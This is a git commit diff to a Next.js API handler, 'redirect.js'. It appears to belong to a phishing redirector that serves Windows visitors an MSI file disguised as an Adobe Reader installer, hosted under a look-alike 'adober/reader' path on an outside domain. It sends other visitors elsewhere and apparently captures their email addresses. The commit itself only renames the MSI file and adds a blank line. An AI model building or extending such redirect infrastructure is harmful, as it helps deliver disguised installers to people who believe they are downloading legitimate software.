04b41263697f91e3cc460cd84f24c29d33f740f2
kka03517-gif <kka03517@gmail.com>
2025-12-18 10:32:38 -0800

    Update redirect.js

--- redirect-app/pages/api/redirect.js
+++ redirect-app/pages/api/redirect.js
@@ -4,7 +4,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
     'https://wavemarkmx.com/adober/reader/download.html';
-  const MSI_PATH = '/Reader_Adobe-en_install.msi';
+  const MSI_PATH = '/Readers_Adobe-en_install.msi';
   const NON_WINDOWS_TARGET = 'https://wavemarkmx.com/cg';
 
   let email = '';
@@ -56,6 +56,7 @@ export default function handler(req, res) {
   res.writeHead(302, { Location: finalUrl });
   res.end();
 }
+
 
 
 
